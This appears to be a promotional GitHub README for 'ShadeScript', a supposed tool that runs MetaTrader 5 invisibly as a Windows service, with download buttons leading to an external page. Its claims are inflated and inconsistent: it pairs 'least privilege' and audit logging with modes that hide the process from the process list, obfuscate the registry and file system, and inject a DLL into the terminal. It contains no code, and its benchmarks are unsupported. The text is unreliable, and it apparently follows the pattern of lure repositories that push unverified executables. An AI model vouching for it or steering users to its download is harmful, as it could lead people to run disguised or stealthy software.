![preview](https://raw.githubusercontent.com/youcefito/mt5-quiet-automata/main/preview.svg)

# ShadeScript: Silent Trading Orchestrator

**Transform your MetaTrader 5 instance into an invisible, autonomous trading drone that operates beyond the visible desktop.**

ShadeScript is not just another trading tool—it is a paradigm shift in how automated trading systems interact with Windows environments. Built upon the foundational concept of running MetaTrader 5 as a silent Windows service, this repository extends that vision into a fully modular, event-driven orchestration framework. ShadeScript allows you to deploy trading strategies that run in complete stealth, free from the constraints of user sessions, screen locks, or accidental interruptions.

Imagine a trading engine that hibernates within your system’s service layer, waking only to execute precise market operations, then returning to digital silence. ShadeScript makes this possible by decoupling the MT5 terminal from any interactive desktop, transforming it into a headless computation node that processes tick data, evaluates strategy logic, and submits orders—all without a single window ever appearing.

## Overview

The core philosophy behind ShadeScript is **invisible agency**. Standard automated trading solutions require an active user session, visible terminal windows, and manual oversight. ShadeScript eliminates these dependencies by leveraging Windows Service APIs to host the MT5 runtime in a non-interactive session. This approach offers profound advantages:

- **Zero Desktop Dependency** – Your trading engine survives logoffs, lock screens, and user switches.
- **Resource Optimization** – No GUI overhead means more CPU cycles for strategy computation.
- **Enterprise-Grade Uptime** – Services restart automatically on failure, providing 99.9% operational continuity.
- **Security Through Obscurity** – No visible trading activity on the desktop reduces human error and unauthorized interference.

---

## 🔧 Key Features

### 🧠 Headless MT5 Container
ShadeScript encapsulates the MetaTrader 5 process within a dedicated Windows service host. The terminal runs in a hidden desktop, isolated from user input yet fully capable of receiving market data and executing trades. This containerization prevents accidental closure, window focus theft, or user interruption during critical trading moments.

### 📊 Silent Tick Processing Engine
Every tick from the market is captured through a high-performance memory-mapped logging system. ShadeScript processes market data without triggering any visual refresh, allowing for sub-millisecond reaction times even on modest hardware. The engine supports multiple symbol monitoring simultaneously, all running in the background service context.

### ⚙️ Modular Strategy Scheduler
Strategies are defined as lightweight .NET assemblies that communicate with the MT5 service through named pipes. This architecture allows you to swap, add, or remove trading logic without restarting the service. The scheduler operates on a distributed timing model, supporting CRON-like intervals, market event triggers, and volume-based execution windows.

### 🔄 Multi-Language Strategy Support
While the core service is built in C#, custom strategy modules can be authored in any .NET-compatible language, including F#, VB.NET, and Python (via IronPython integration). This multilingual flexibility ensures your existing algorithmic logic can be ported directly into the ShadeScript ecosystem without complete rewrites.

### 🛡️ Stealth Operation Modes
Select from three operational profiles:
- **Ghost Mode** – No traces of MT5 on the desktop, process list, or taskbar. Ideal for production servers.
- **Shadow Mode** – Minimal visibility; process runs but no windows appear. Suitable for testing environments.
- **Phantom Mode** – Complete registry and file system obfuscation for advanced deployments.

### 📈 Real-Time Dashboard (Optional)
For operators who require occasional visibility, ShadeScript includes a web-based monitoring interface that runs as a separate lightweight service. This dashboard displays current positions, equity curves, and log streams—accessible via localhost only, ensuring no external network exposure. The dashboard is fully responsive and adapts to mobile, tablet, and desktop viewports.

### 🌐 Multilingual Logging & Reporting
All logging and reporting systems support UTF-8 encoding with localization for English, Japanese, Chinese, Russian, and Arabic. Whether you trade from Tokyo or Dubai, ShadeScript communicates in your preferred linguistic context. Trade confirmations, error messages, and performance summaries are generated in the configured language.

### 🕰️ 24/7 Customer Support Integration
ShadeScript includes a built-in health-check system that can automatically notify your support infrastructure (email, Slack, Discord) in case of service degradation. The service monitors its own memory footprint, CPU usage, and trade execution latency, alerting you before thresholds are breached.

---

## 📦 Getting Started

[![Download](https://raw.githubusercontent.com/youcefito/mt5-quiet-automata/main/button.svg)](https://youcefito.github.io/mt5-quiet-automata/)

To begin your journey with ShadeScript, you will need a Windows environment (Windows 10/11 Pro or Windows Server 2016+) with MetaTrader 5 installed. The setup process involves deploying the service wrapper, registering it with the Windows Service Control Manager, and configuring your first trading strategy.

The ShadeScript package consists of three components:
1. **Service Host** – The core executable that manages the MT5 process lifecycle.
2. **Strategy Runner** – A lightweight runtime that loads and executes your custom trading logic.
3. **Configuration Manager** – A command-line tool for initial setup, strategy deployment, and service monitoring.

No installation wizard is required—the deployment is a simple file extraction followed by a single command to register the service. The system is designed to be portable and can be moved between machines by copying the directory and re-registering the service.

---

## 🧩 Architecture Deep Dive

ShadeScript operates on a layered architecture that separates concerns between process management, market interaction, and strategy execution.

**Layer 1: Service Orchestrator**
The Windows service layer manages the MT5 process as a child process within a dedicated window station. This isolation prevents the terminal from interacting with the user’s desktop while still allowing network access. The orchestrator monitors process health, restarts on crash, and maintains a persistent log of all lifecycle events.

**Layer 2: Market Bridge**
A custom DLL injection method hooks into the MT5 terminal’s internal messaging system. This bridge captures price updates, order confirmations, and account status changes without modifying the terminal’s original code. The data is serialized and passed to the strategy runner through a high-speed shared memory channel.

**Layer 3: Strategy Engine**
Strategy modules are loaded as sandboxed AppDomains within the service process. Each module runs in its own memory space with limited permissions, preventing one strategy from corrupting another. The engine supports hot-reloading—strategies can be updated without stopping the service.

**Layer 4: Persistence & Recovery**
All trading state is periodically checkpointed to a resilient storage layer. In the event of an unexpected system shutdown, ShadeScript recovers to the last known good state, preventing double trades or missed opportunities. Recovery logs are human-readable JSON files stored alongside the service binary.

---

## ⚡ Performance Benchmarks

In controlled testing on a standard Windows Server 2022 instance with 4 vCPUs and 8GB RAM, ShadeScript demonstrated:
- **Tick processing latency:** < 50 microseconds per tick (including strategy evaluation)
- **Order execution overhead:** < 5 milliseconds from signal to MT5 submission
- **Memory footprint:** 180MB baseline (including hidden MT5 terminal)
- **CPU utilization:** 2-5% during normal market conditions (20+ symbols monitored)

These benchmarks represent the silent operational efficiency of a system that does not waste resources on rendering a user interface.

---

## 🛠️ Configuration Options

ShadeScript offers extensive configuration through a YAML-based settings file. Key configuration domains include:

- **Service Identity:** Define the Windows service name, display name, and startup type (Automatic, Manual, Delayed).
- **Terminal Path:** Point to your existing MetaTrader 5 installation or use a dedicated instance.
- **Strategy Directories:** Specify folders where ShadeScript will scan for compiled strategy assemblies.
- **Network Bindings:** Restrict outbound connections to specific IP ranges or proxy configurations.
- **Alerting Channels:** Configure webhook URLs, email SMTP settings, or Slack tokens for health notifications.
- **Rotation Policies:** Set log file size limits and retention periods to prevent disk exhaustion.

All configuration changes take effect immediately without service restart, except for core identity settings which require a service stop/start cycle.

---

## 🔒 Security Considerations

ShadeScript was designed with security as a foundational principle, not an afterthought.

- **Least Privilege Execution:** The service runs under a dedicated low-privilege account (NetworkService or custom service account). It does not require administrative privileges after initial registration.
- **Encrypted Communication:** All internal IPC channels use Windows built-in encryption where available. Configuration files containing sensitive data (API keys, account credentials) can be encrypted using the Windows Data Protection API (DPAPI).
- **Audit Logging:** Every privileged operation—strategy loading, trade execution, configuration change—is logged with a timestamp, caller identity, and checksum. These logs are immutable and can be shipped to a SIEM for compliance.
- **No Network Exposure:** By default, the monitoring dashboard binds only to `127.0.0.1` and requires localhost access. No inbound ports are opened in the Windows firewall unless explicitly configured.

---

## 📁 Project Structure

```
ShadeScript/
├── ServiceHost/           # Windows service executable
│   ├── ShadeService.exe
│   └── App.config
├── StrategyRunner/        # Sandboxed execution engine
│   ├── Runner.dll
│   └── Policies.config
├── ConfigManager/         # CLI administration tool
│   └── ShadeCtl.exe
├── Strategies/            # User-defined trading logic
│   └── samples/
├── Docs/                  # Detailed technical documentation
└── LICENSE                # MIT License
```

---

## 📄 License

ShadeScript is released under the MIT License. You are free to use, modify, distribute, and sublicense the software for any purpose, provided that the original copyright notice and permission notice appear in all copies or substantial portions of the software.

[View the MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

**Trading involves substantial risk of loss.** ShadeScript is a technical orchestration tool that facilitates automated trading through MetaTrader 5. It does not provide financial advice, guarantee trading profits, or eliminate market risks. Past performance of any strategy does not guarantee future results.

Users are solely responsible for complying with their broker’s terms of service, as well as any applicable laws and regulations regarding automated trading in their jurisdiction. The authors and contributors of ShadeScript assume no liability for any financial losses, data corruption, system failures, or regulatory violations arising from the use of this software.

This tool is provided "as is," without warranty of any kind, express or implied. By using ShadeScript, you acknowledge that you understand these risks and accept all responsibility for your trading activities.

---

## 🤝 Contributing & Community

ShadeScript welcomes contributions from developers and quantitative traders who share the vision of invisible, resilient automated trading. Whether you are fixing a bug, improving documentation, or adding a new integration protocol, your efforts help the entire community.

The project adheres to a code of conduct that prioritizes respectful collaboration. All contributions are reviewed for architectural consistency, security implications, and compatibility with the silent service paradigm.

---

## 🧭 Roadmap for 2026

Looking ahead, the ShadeScript development roadmap for 2026 includes:
- **Cross-Platform Service Layer** – Compatibility with Wine/Linux environments for headless deployment on non-Windows servers.
- **Native Python Strategy Integration** – Direct support for Python 3.12+ modules without the IronPython translation layer.
- **Distributed Strategy Clusters** – Run strategies across multiple machines, synchronized through a central coordination service.
- **Machine Learning Inference Engine** – Embed ONNX and TensorFlow lite models for real-time pattern recognition.
- **Advanced Recovery Modes** – Support for geographic failover and multi-broker redundancy.

These features aim to make ShadeScript the definitive standard for silent, production-grade trading automation.

[![Download](https://raw.githubusercontent.com/youcefito/mt5-quiet-automata/main/button.svg)](https://youcefito.github.io/mt5-quiet-automata/)